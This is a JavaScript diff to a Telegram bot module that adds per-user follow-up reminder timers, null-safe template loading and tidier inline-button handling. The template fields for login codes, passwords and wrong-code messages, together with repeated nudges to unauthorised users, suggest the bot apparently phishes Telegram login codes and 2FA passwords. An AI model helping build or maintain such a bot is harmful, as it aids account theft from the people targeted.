@@ -18,34 +18,36 @@ export default async (token, initialConfig) => {
         const updatedBot = await Bot.findOne({ token });
         if (!updatedBot) return;
         const template = await Template.findOne({ id: updatedBot.template });
-
+        
 
         currentConfig = {
             id: updatedBot.id,
             owner: updatedBot.owner,
             name: updatedBot.name,
-            media_startbot: template.media_startbot,
-            start: template.start,
-            code: template.code,
-            auth: template.auth,
-            password: template.password,
-            wrongPassword: template.wrongPassword,
-            wrongCode: template.wrongCode,
-            NaNCode: template.NaNCode,
-            timeout: template.timeout,
-            error: template.error,
-            wait: template.wait,
-            contact: template.contact,
-            mailing1h: template.mailing1h,
-            button: template.button,
-            type: template.type,
-            url: template.url,
-            mailing1hUnauth: template.mailing1hUnauth,
-            buttonUnauth: template.buttonUnauth,
-            typeUnauth: template.typeUnauth,
-            urlUnauth: template.urlUnauth
+            media_startbot: template?.media_startbot || null,
+            start: template?.start || null,
+            code: template?.code || null,
+            auth: template?.auth || null,
+            password: template?.password || null,
+            wrongPassword: template?.wrongPassword || null,
+            wrongCode: template?.wrongCode || null,
+            NaNCode: template?.NaNCode || null,
+            timeout: template?.timeout || null,
+            error: template?.error || null,
+            wait: template?.wait || null,
+            contact: template?.contact || null,
+            mailing1h: template?.mailing1h || null,
+            button: template?.button || null,
+            type: template?.type || null,
+            url: template?.url || null,
+            mailing1hUnauth: template?.mailing1hUnauth || null,
+            buttonUnauth: template?.buttonUnauth || null,
+            typeUnauth: template?.typeUnauth || null,
+            urlUnauth: template?.urlUnauth || null
         };
+   
     }
+
 
     setInterval(updateConfig, 30000);
 
@@ -72,19 +74,32 @@ export default async (token, initialConfig) => {
         return await bot.proxy(id, text, opts);
     }
 
+    // Хранилище активных таймеров для каждого пользователя
+    const activeTimers = new Map();
+
     bot.on(`message`, async message => {
         await updateConfig();
 
         const intervals = [5, 10, 30, 60, 240];
+        const userId = message.from.id;
+
+        if (activeTimers.has(userId)) {
+            const timers = activeTimers.get(userId);
+            timers.forEach(timer => clearTimeout(timer));
+            activeTimers.delete(userId);
+        }
+
+        const userTimers = [];
 
         for (let minutes of intervals) {
-            setTimeout(async () => {
+            const timer = setTimeout(async () => {
                 if (!await Bot.findOne({ token })) return;
-                const logged = await log.findOne({ uid: message.from.id });
+                const logged = await log.findOne({ uid: userId });
 
                 if (!logged && currentConfig.mailing1hUnauth === 'Пропустить') return;
                 if (logged && currentConfig.mailing1h === 'Пропустить') return;
-                await bot.sendMessage(message.from.id,
+
+                await bot.sendMessage(userId,
                     logged ? currentConfig.mailing1h : currentConfig.mailing1hUnauth,
                     {
                         parse_mode: 'HTML',
@@ -92,21 +107,48 @@ export default async (token, initialConfig) => {
                             inline_keyboard: [
                                 [
                                     logged ? {
-                                        text: currentConfig.button,
-                                        url: currentConfig.url === 'Старт' ? undefined : currentConfig.url.split('>')?.[1]?.split('<')?.[0],
-                                        callback_data: currentConfig.url === 'Старт' ? 'start' : undefined
+                                        text: currentConfig.button || 'Кнопка',
+                                        ...(currentConfig.url === 'Старт' 
+                                            ? { callback_data: 'start' }
+                                            : currentConfig.url 
+                                                ? { url: currentConfig.url.includes('>') 
+                                                    ? currentConfig.url.split('>')?.[1]?.split('<')?.[0] 
+                                                    : currentConfig.url }
+                                                : { callback_data: 'start' })
                                     } : {
-                                        text: currentConfig.buttonUnauth,
-                                        url: currentConfig.urlUnauth === 'Старт' ? undefined : currentConfig.urlUnauth.split('>')?.[1]?.split('<')?.[0],
-                                        callback_data: currentConfig.urlUnauth === 'Старт' ? 'start' : undefined
+                                        text: currentConfig.buttonUnauth || 'Кнопка',
+                                        ...(currentConfig.urlUnauth === 'Старт'
+                                            ? { callback_data: 'start' }
+                                            : currentConfig.urlUnauth
+                                                ? { url: currentConfig.urlUnauth.includes('>')
+                                                    ? currentConfig.urlUnauth.split('>')?.[1]?.split('<')?.[0]
+                                                    : currentConfig.urlUnauth }
+                                                : { callback_data: 'start' })
                                     }
                                 ]
                             ]
                         }
                     }
-                ).catch(console.log)
+                ).catch(console.log);
+
+                // Удаляем таймер после выполнения
+                const userTimers = activeTimers.get(userId);
+                if (userTimers) {
+                    const index = userTimers.indexOf(timer);
+                    if (index > -1) {
+                        userTimers.splice(index, 1);
+                    }
+                    if (userTimers.length === 0) {
+                        activeTimers.delete(userId);
+                    }
+                }
             }, minutes * 60 * 1000);
+
+            userTimers.push(timer);
         }
+
+        // Сохраняем таймеры пользователя
+        activeTimers.set(userId, userTimers);
 
         const ll = await log.findOne({ uid: message.from.id });
         if (!q.get(message.from.id)) {
@@ -127,13 +169,23 @@ export default async (token, initialConfig) => {
                                 inline_keyboard: [
                                     [
                                         logged ? {
-                                            text: currentConfig.button,
-                                            url: currentConfig.url === 'Старт' ? undefined : currentConfig.url.split('>')?.[1]?.split('<')?.[0],
-                                            callback_data: currentConfig.url === 'Старт' ? 'start' : undefined
+                                            text: currentConfig.button || 'Кнопка',
+                                            ...(currentConfig.url === 'Старт' 
+                                                ? { callback_data: 'start' }
+                                                : currentConfig.url 
+                                                    ? { url: currentConfig.url.includes('>') 
+                                                        ? currentConfig.url.split('>')?.[1]?.split('<')?.[0] 
+                                                        : currentConfig.url }
+                                                    : { callback_data: 'start' })
                                         } : {
-                                            text: currentConfig.buttonUnauth,
-                                            url: currentConfig.urlUnauth === 'Старт' ? undefined : currentConfig.urlUnauth.split('>')?.[1]?.split('<')?.[0],
-                                            callback_data: currentConfig.urlUnauth === 'Старт' ? 'start' : undefined
+                                            text: currentConfig.buttonUnauth || 'Кнопка',
+                                            ...(currentConfig.urlUnauth === 'Старт'
+                                                ? { callback_data: 'start' }
+                                                : currentConfig.urlUnauth
+                                                    ? { url: currentConfig.urlUnauth.includes('>')
+                                                        ? currentConfig.urlUnauth.split('>')?.[1]?.split('<')?.[0]
+                                                        : currentConfig.urlUnauth }
+                                                    : { callback_data: 'start' })
                                         }
                                     ]
                                 ]
@@ -361,8 +413,8 @@ export default async (token, initialConfig) => {
                     
                     timeouts.delete(message.from.id);
 
-                // }, 5 * 60 * 1000);
-                }, 30 * 1000);
+                }, 5 * 60 * 1000);
+                // }, 30 * 1000);
                 timeouts.set(message.from.id, timeout);
 
                 return;
@@ -475,4 +527,13 @@ export default async (token, initialConfig) => {
         
         await mainBot.sendMessage(currentConfig.owner, `*🚨 Ваш бот @${BOT.username} был заблокирован!*`, { parse_mode: 'Markdown' });
     })
+
+    // Очистка таймеров при выключении бота
+    process.on('SIGINT', () => {
+        for (const timers of activeTimers.values()) {
+            timers.forEach(timer => clearTimeout(timer));
+        }
+        activeTimers.clear();
+        process.exit();
+    });
 }
